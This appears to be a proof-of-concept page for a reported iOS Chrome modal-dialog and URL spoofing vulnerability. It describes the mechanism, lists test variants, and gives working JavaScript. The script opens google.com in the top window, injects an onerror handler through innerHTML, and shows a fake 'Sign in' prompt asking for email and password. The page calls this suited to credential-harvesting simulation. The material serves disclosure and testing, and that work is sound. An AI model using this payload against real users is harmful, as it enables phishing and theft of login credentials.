📋 Vulnerability Details

  • Issue ID: 40061297
  • Affected: iOS Chrome (tested on v106.0.5249.92)
  • Type: Modal Dialog Spoofing / URL Spoof
  • Impact: Full URL spoof via prompt() without origin display
  • Status: Reported to Chromium Security Team

⚙️ Test Configuration

🔬 How It Works

  • Opens target URL in new window with _top reference
  • Injects malicious code via document.body.innerHTML
  • Triggers prompt() after calculated delay
  • iOS Chrome shows prompt without origin information
  • User sees legitimate URL but spoofed dialog
  • Perfect for phishing/credential harvesting simulation

🎯 Test Variants

  • Standard Test: Original PoC with improved timing
  • Improved Test: Event-based loading with fallback
  • Aggressive Test: Multiple dialog attempts
  • Event-Based: Pure event-driven approach
// Original PoC Code (improved) function executeSpoof() { const target = 'https://www.google.com'; const x = open(target, '_top'); if (x) { x.document.body.innerHTML = '<img src="" onerror="setTimeout(() => { prompt(\'Sign in to access www.google.com\', \'Email/Password\'); }, 500)">'; } } setTimeout(executeSpoof, 3000);
